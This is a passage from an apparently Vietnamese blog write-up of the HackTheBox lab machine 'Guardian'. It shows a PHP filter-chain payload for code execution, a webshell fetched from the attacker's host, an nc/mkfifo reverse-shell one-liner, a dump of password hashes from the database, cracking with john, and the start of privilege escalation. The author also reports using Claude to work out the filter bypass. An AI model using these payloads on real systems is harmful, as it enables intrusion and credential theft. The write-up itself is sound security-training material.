<p>Với cách này thì chỉ có thể in ra các file trong whitelist. Tìm kiếm các cách bypass khác trong các cheatsheet, tôi tìm thấy <a href="https://github.com/synacktiv/php_filter_chain_generator"  target="_blank" rel="noreferrer">php_filter_chain_generator</a> trong <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/Wrappers/#wrapper-phpfilter"  target="_blank" rel="noreferrer">PayloadsAllTheThings - File Inclusion</a></p>
<p>Clone repo này về và tạo 1 payload đơn giản.</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 php_filter_chain_generator.py --chain <span class="s1">&#39;&lt;?php system(&#34;whoami&#34;); ?&gt;&#39;</span></span></span></code></pre></div></div>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/machines/Guardian/php_filter_chain_generator<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ python3 php_filter_chain_generator.py --chain <span class="s1">&#39;&lt;?php system(&#34;whoami&#34;); ?&gt;&#39;</span>   
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> The following gadget chain will generate the following code : &lt;?php system<span class="o">(</span><span class="s2">&#34;whoami&#34;</span><span class="o">)</span><span class="p">;</span> ?&gt; <span class="o">(</span>base64 value: PD9waHAgc3lzdGVtKCJ3aG9hbWkiKTsgPz4<span class="o">)</span>
</span></span><span class="line"><span class="cl">php://filter/convert.iconv.UTF8.CSISO2022KR<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.iconv.CP866.CSUNICODE<span class="p">|</span>convert.iconv.CSISOLAT...............decode<span class="p">|</span>convert.base64-encode<span class="p">|</span>convert.iconv.UTF8.UTF7<span class="p">|</span>convert.base64-decode/resource<span class="o">=</span>php://temp</span></span></code></pre></div></div>
<p>Tuy nhiên payload này không thỏa mãn đủ các điều kiện của filter. Để tiết kiệm thời gian, tôi hỏi AI, cụ thể là Claude, về cách để bypass đoạn filter trong source code bằng php filter</p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="897"
    height="553"
    src="/ctf/hackthebox/guardian/23_hu_2645df68945692a1.png"
    srcset="/ctf/hackthebox/guardian/23_hu_2645df68945692a1.png 800w, /ctf/hackthebox/guardian/23.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/23.png"></figure>
<p>Thêm Bypass regex vào cuối payload</p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="1514"
    height="597"
    src="/ctf/hackthebox/guardian/24_hu_ff05e9d427cb50f0.png"
    srcset="/ctf/hackthebox/guardian/24_hu_ff05e9d427cb50f0.png 800w, /ctf/hackthebox/guardian/24_hu_60c1f5d63d208f57.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/24.png"></figure>
<p>Thành công! Tuy nhiên khi thử nghiệm với rất nhiều payload và revershell (bất kỳ payload nào trong <a href="https://www.revshells.com/"  target="_blank" rel="noreferrer">https://www.revshells.com/</a>) khác nhau nhưng đều không có kết quả.</p>
<p>Một lần nữa phải nhờ đến anh bạn Claude và tôi đã nhận được đáp án khả thi.</p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="781"
    height="312"
    src="/ctf/hackthebox/guardian/25.png"
    srcset="/ctf/hackthebox/guardian/25.png 800w, /ctf/hackthebox/guardian/25.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/25.png"></figure>
<p>Clone repo về và bật http server để đẩy <code>phpbash.php</code> lên server</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/machines/Guardian<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ git clone https://github.com/Arrexel/phpbash.git                    
</span></span><span class="line"><span class="cl">Cloning into <span class="s1">&#39;phpbash&#39;</span>...
</span></span><span class="line"><span class="cl">remote: Enumerating objects: 85, <span class="k">done</span>.
</span></span><span class="line"><span class="cl">remote: Total <span class="m">85</span> <span class="o">(</span>delta 0<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused <span class="m">85</span> <span class="o">(</span>from 1<span class="o">)</span>
</span></span><span class="line"><span class="cl">Receiving objects: 100% <span class="o">(</span>85/85<span class="o">)</span>, 34.02 KiB <span class="p">|</span> 11.34 MiB/s, <span class="k">done</span>.
</span></span><span class="line"><span class="cl">Resolving deltas: 100% <span class="o">(</span>40/40<span class="o">)</span>, <span class="k">done</span>.
</span></span><span class="line"><span class="cl">                                                              
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/machines/Guardian<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ <span class="nb">cd</span> phpbash 
</span></span><span class="line"><span class="cl">                                                               
</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/machines/Guardian/phpbash<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ python3 -m http.server
</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">8000</span> <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...</span></span></code></pre></div></div>
<p>Tạo lại payload với <code>php_filter_chain_generator</code>, dán payload vào Burpsuite</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 php_filter_chain_generator.py --chain <span class="s1">&#39;&lt;?php system(&#34;wget http://10.10.14.165:8000/phpbash.php&#34;); ?&gt;&#39;</span></span></span></code></pre></div></div>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="1515"
    height="596"
    src="/ctf/hackthebox/guardian/26_hu_77b0aba9ee68a33b.png"
    srcset="/ctf/hackthebox/guardian/26_hu_77b0aba9ee68a33b.png 800w, /ctf/hackthebox/guardian/26_hu_2b161a555aef413c.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/26.png"></figure>
<p>Truy cập file <code>phpbash.php</code> trong thư mục <code>admin/</code></p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="1284"
    height="853"
    src="/ctf/hackthebox/guardian/27_hu_32c523c7b8f3b5c2.png"
    srcset="/ctf/hackthebox/guardian/27_hu_32c523c7b8f3b5c2.png 800w, /ctf/hackthebox/guardian/27_hu_280fc2fb1b86b09e.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/27.png"></figure>
<p>Sử dụng revershell</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/bash -i 2&gt;<span class="p">&amp;</span>1<span class="p">|</span>nc 10.10.14.165 <span class="m">9999</span> &gt;/tmp/f</span></span></code></pre></div></div>
<p>Copy nó vào webshell và Enter. Quay trở lại kali terminal</p>
<figure><img
    class="my-0 rounded-md"
    loading="lazy"
    decoding="async"
    fetchpriority="auto"
    alt=""
    width="1674"
    height="491"
    src="/ctf/hackthebox/guardian/28_hu_84b458891ced1ae3.png"
    srcset="/ctf/hackthebox/guardian/28_hu_84b458891ced1ae3.png 800w, /ctf/hackthebox/guardian/28_hu_92877c8f86b0cd05.png 1280w"
    sizes="(min-width: 768px) 50vw, 65vw"
    data-zoom-src="/ctf/hackthebox/guardian/28.png"></figure>

<h2 class="relative group">User
    <div id="user" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#user" aria-label="Anchor">#</a>
    </span>
    
</h2>
<p>Sử dụng thông tin đăng nhập của root truy cập vào mysql đã tìm thấy bên trong source code</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@guardian:~$ mysql -h localhost -u root -p<span class="s1">&#39;Gu4rd14n_un1_1s_th3_b3st&#39;</span>
</span></span><span class="line"><span class="cl">mysql: <span class="o">[</span>Warning<span class="o">]</span> Using a password on the <span class="nb">command</span> line interface can be insecure.
</span></span><span class="line"><span class="cl">Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
</span></span><span class="line"><span class="cl">Your MySQL connection id is <span class="m">787295</span>
</span></span><span class="line"><span class="cl">Server version: 8.0.43-0ubuntu0.22.04.1 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2025, Oracle and/or its affiliates.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Oracle is a registered trademark of Oracle Corporation and/or its
</span></span><span class="line"><span class="cl">affiliates. Other names may be trademarks of their respective
</span></span><span class="line"><span class="cl">owners.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mysql&gt; </span></span></code></pre></div></div>
<p>Tìm kiếm và khai thác các thông tin trong db này.</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysql&gt; show databases<span class="p">;</span>
</span></span><span class="line"><span class="cl">+--------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> Database           <span class="p">|</span>
</span></span><span class="line"><span class="cl">+--------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> guardiandb         <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> information_schema <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> mysql              <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> performance_schema <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> sys                <span class="p">|</span>
</span></span><span class="line"><span class="cl">+--------------------+
</span></span><span class="line"><span class="cl"><span class="m">5</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mysql&gt; use guardiandb<span class="p">;</span>
</span></span><span class="line"><span class="cl">Reading table information <span class="k">for</span> completion of table and column names
</span></span><span class="line"><span class="cl">You can turn off this feature to get a quicker startup with -A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Database changed
</span></span><span class="line"><span class="cl">mysql&gt; show tables
</span></span><span class="line"><span class="cl">    -&gt; <span class="p">;</span>
</span></span><span class="line"><span class="cl">+----------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> Tables_in_guardiandb <span class="p">|</span>
</span></span><span class="line"><span class="cl">+----------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> assignments          <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> courses              <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> enrollments          <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> grades               <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> messages             <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> notices              <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> programs             <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> submissions          <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> users                <span class="p">|</span>
</span></span><span class="line"><span class="cl">+----------------------+
</span></span><span class="line"><span class="cl"><span class="m">9</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mysql&gt; desc users<span class="p">;</span>
</span></span><span class="line"><span class="cl">+---------------+------------------------------------+------+-----+-------------------+-----------------------------------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> Field         <span class="p">|</span> Type                               <span class="p">|</span> Null <span class="p">|</span> Key <span class="p">|</span> Default           <span class="p">|</span> Extra                                         <span class="p">|</span>
</span></span><span class="line"><span class="cl">+---------------+------------------------------------+------+-----+-------------------+-----------------------------------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> user_id       <span class="p">|</span> int                                <span class="p">|</span> NO   <span class="p">|</span> PRI <span class="p">|</span> NULL              <span class="p">|</span> auto_increment                                <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> username      <span class="p">|</span> varchar<span class="o">(</span>255<span class="o">)</span>                       <span class="p">|</span> YES  <span class="p">|</span> UNI <span class="p">|</span> NULL              <span class="p">|</span>                                               <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> password_hash <span class="p">|</span> varchar<span class="o">(</span>255<span class="o">)</span>                       <span class="p">|</span> YES  <span class="p">|</span>     <span class="p">|</span> NULL              <span class="p">|</span>                                               <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> full_name     <span class="p">|</span> varchar<span class="o">(</span>255<span class="o">)</span>                       <span class="p">|</span> YES  <span class="p">|</span>     <span class="p">|</span> NULL              <span class="p">|</span>                                               <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> email         <span class="p">|</span> varchar<span class="o">(</span>255<span class="o">)</span>                       <span class="p">|</span> YES  <span class="p">|</span>     <span class="p">|</span> NULL              <span class="p">|</span>                                               <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> dob           <span class="p">|</span> date                               <span class="p">|</span> YES  <span class="p">|</span>     <span class="p">|</span> NULL              <span class="p">|</span>                                               <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> address       <span class="p">|</span> text                               <span class="p">|</span> YES  <span class="p">|</span>     <span class="p">|</span> NULL              <span class="p">|</span>                                               <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> user_role     <span class="p">|</span> enum<span class="o">(</span><span class="s1">&#39;student&#39;</span>,<span class="s1">&#39;lecturer&#39;</span>,<span class="s1">&#39;admin&#39;</span><span class="o">)</span> <span class="p">|</span> YES  <span class="p">|</span>     <span class="p">|</span> student           <span class="p">|</span>                                               <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> status        <span class="p">|</span> enum<span class="o">(</span><span class="s1">&#39;active&#39;</span>,<span class="s1">&#39;inactive&#39;</span><span class="o">)</span>          <span class="p">|</span> YES  <span class="p">|</span>     <span class="p">|</span> active            <span class="p">|</span>                                               <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> created_at    <span class="p">|</span> timestamp                          <span class="p">|</span> YES  <span class="p">|</span>     <span class="p">|</span> CURRENT_TIMESTAMP <span class="p">|</span> DEFAULT_GENERATED                             <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> updated_at    <span class="p">|</span> timestamp                          <span class="p">|</span> YES  <span class="p">|</span>     <span class="p">|</span> CURRENT_TIMESTAMP <span class="p">|</span> DEFAULT_GENERATED on update CURRENT_TIMESTAMP <span class="p">|</span>
</span></span><span class="line"><span class="cl">+---------------+------------------------------------+------+-----+-------------------+-----------------------------------------------+
</span></span><span class="line"><span class="cl"><span class="m">11</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mysql&gt; <span class="k">select</span> username,password_hash,email,user_role from users<span class="p">;</span>
</span></span><span class="line"><span class="cl">+--------------------+------------------------------------------------------------------+---------------------------------+-----------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> username           <span class="p">|</span> password_hash                                                    <span class="p">|</span> email                           <span class="p">|</span> user_role <span class="p">|</span>
</span></span><span class="line"><span class="cl">+--------------------+------------------------------------------------------------------+---------------------------------+-----------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> admin              <span class="p">|</span> 694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6 <span class="p">|</span> admin@guardian.htb              <span class="p">|</span> admin     <span class="p">|</span>
</span></span><span class="line"><span class="cl">........................
</span></span><span class="line"><span class="cl"><span class="p">|</span> GU3052023          <span class="p">|</span> 2ef01f607f86387d0c94fc2a3502cc3e6d8715d3b1f124b338623b41aed40cf8 <span class="p">|</span> GU3052023@guardian.htb          <span class="p">|</span> student   <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> GU1462023          <span class="p">|</span> 585aacf74b22a543022416ed771dca611bd78939908c8323f4f5efef5b4e0202 <span class="p">|</span> GU1462023@guardian.htb          <span class="p">|</span> student   <span class="p">|</span>
</span></span><span class="line"><span class="cl">+--------------------+------------------------------------------------------------------+---------------------------------+-----------+
</span></span><span class="line"><span class="cl"><span class="m">62</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span></span></span></code></pre></div></div>
<p>Vì có quá nhiều hash ở đây mà copy thủ công thì rất mệt nên tôi sẽ lưu db này về kali</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@guardian:~$ mysql -h localhost -u root -p<span class="s1">&#39;Gu4rd14n_un1_1s_th3_b3st&#39;</span> -e <span class="s1">&#39;use guardiandb;select * from users&#39;</span> &gt;&gt; users.sql
</span></span><span class="line"><span class="cl">www-data@guardian:~$ python3 -m http.server
</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">8000</span> <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...</span></span></code></pre></div></div>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget http://10.10.11.84:8000/users.sql</span></span></code></pre></div></div>
<p>Nhớ lại trong <code>config.php</code> có thêm <code>salt</code> để tạo hash ngẫu nhiên, thêm nữa trong <code>createuser.php</code> cũng đã khẳng định về việc dùng <code>salt</code> với thuật toán mã hóa SHA256. Vậy thì để crack được password này, tôi cũng cần phải sử dụng <code>salt</code> trong câu lệnh crack.</p>
<p>Đoạn này thì lại phải nhờ anh bạn Claude lọc file <code>users.sql</code> và lấy ra username, password hash, sau đó sửa lại định dạng để có thể đưa vào tool crack (username:hash$salt). Kết quả</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">admin:694a63de406521120d9....0f7da535fd6d6$8Sb)tM1vs1SS
</span></span><span class="line"><span class="cl">jamil.enockson:c1d8dfaeee103d01a5a....02ff4f9a43ee440250$8Sb)tM1vs1SS
</span></span><span class="line"><span class="cl">mark.pargetter:8623e713bb98ba2d4....e4ba1cc6f37f97a10e$8Sb)tM1vs1SS
</span></span><span class="line"><span class="cl">valentijn.temby:1d1bb7b3c6a2a461362....2b2a9cd3c0ff284e6$8Sb)tM1vs1SS
</span></span><span class="line"><span class="cl">................</span></span></code></pre></div></div>
<p>Dùng <code>john</code> để crack password, chọn crack format là SHA256</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">john -w<span class="o">=</span>/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --format<span class="o">=</span><span class="nv">dynamic</span><span class="o">=</span><span class="s1">&#39;sha256($p.$s)&#39;</span> hash.txt</span></span></code></pre></div></div>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/machines/Guardian<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ john -w<span class="o">=</span>/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --format<span class="o">=</span><span class="nv">dynamic</span><span class="o">=</span><span class="s1">&#39;sha256($p.$s)&#39;</span> hash.txt
</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
</span></span><span class="line"><span class="cl">Loaded <span class="m">9</span> password hashes with no different salts <span class="o">(</span><span class="nv">dynamic</span><span class="o">=</span>sha256<span class="o">(</span><span class="nv">$p</span>.<span class="nv">$s</span><span class="o">)</span> <span class="o">[</span>512/512 AVX512BW 16x<span class="o">])</span>
</span></span><span class="line"><span class="cl">Warning: no OpenMP support <span class="k">for</span> this <span class="nb">hash</span> type, consider --fork<span class="o">=</span><span class="m">10</span>
</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
</span></span><span class="line"><span class="cl">*********    <span class="o">(</span>jamil.enockson<span class="o">)</span>     
</span></span><span class="line"><span class="cl">*********      <span class="o">(</span>admin<span class="o">)</span>     </span></span></code></pre></div></div>
<p>Thử login ssh với password vừa tìm được.</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb/machines/Guardian<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ ssh jamil@10.10.11.84
</span></span><span class="line"><span class="cl">jamil@10.10.11.84<span class="err">&#39;</span>s password: 
</span></span><span class="line"><span class="cl">jamil@guardian:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>jamil<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>jamil<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>jamil<span class="o">)</span>,1002<span class="o">(</span>admins<span class="o">)</span>
</span></span><span class="line"><span class="cl">jamil@guardian:~$ ls
</span></span><span class="line"><span class="cl">user.txt
</span></span><span class="line"><span class="cl">jamil@guardian:~$ </span></span></code></pre></div></div>

<h2 class="relative group">Privilege escalation
    <div id="privilege-escalation" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#privilege-escalation" aria-label="Anchor">#</a>
    </span>
    
</h2>

<h3 class="relative group">mark
    <div id="mark" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#mark" aria-label="Anchor">#</a>
    </span>
    
</h3>
<p><code>sudo -l</code></p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">jamil@guardian:~$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> jamil on guardian:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User jamil may run the following commands on guardian:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>mark<span class="o">)</span> NOPASSWD: /opt/scripts/utilities/utilities.py</span></span></code></pre></div></div>
<p>Kiểm tra thông tin của file này</p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">jamil@guardian:~$ ll /opt/scripts/utilities/utilities.py 
</span></span><span class="line"><span class="cl">-rwxr-x--- <span class="m">1</span> root admins <span class="m">1136</span> Apr <span class="m">20</span>  <span class="m">2025</span> /opt/scripts/utilities/utilities.py*</span></span></code></pre></div></div>
<p>Group <code>admins</code> có quyền thực thi file này, đồng thời user <code>jamil</code> cũng nằm trong group <code>admins</code>.</p>
<p><code>cat /opt/scripts/utilities/utilities.py</code></p>
<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">getpass</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">utils</span> <span class="kn">import</span> <span class="n">db</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">utils</span> <span class="kn">import</span> <span class="n">attachments</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">utils</span> <span class="kn">import</span> <span class="n">logs</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">utils</span> <span class="kn">import</span> <span class="n">status</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s2">&#34;University Server Utilities Toolkit&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&#34;action&#34;</span><span class="p">,</span> <span class="n">choices</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;backup-db&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;zip-attachments&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;collect-logs&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;system-status&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">],</span> <span class="n">help</span><span class="o">=</span><span class="s2">&#34;Action to perform&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">user</span> <span class="o">=</span> <span class="n">getpass</span><span class="o">.</span><span class="n">getuser</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">action</span> <span class="o">==</span> <span class="s2">&#34;backup-db&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">user</span> <span class="o">!=</span> <span class="s2">&#34;mark&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Access denied.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">db</span><span class="o">.</span><span class="n">backup_database</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">action</span> <span class="o">==</span> <span class="s2">&#34;zip-attachments&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">user</span> <span class="o">!=</span> <span class="s2">&#34;mark&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Access denied.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">attachments</span><span class="o">.</span><span class="n">zip_attachments</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">action</span> <span class="o">==</span> <span class="s2">&#34;collect-logs&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">user</span> <span class="o">!=</span> <span class="s2">&#34;mark&#34;</span><span class="p">:</span>
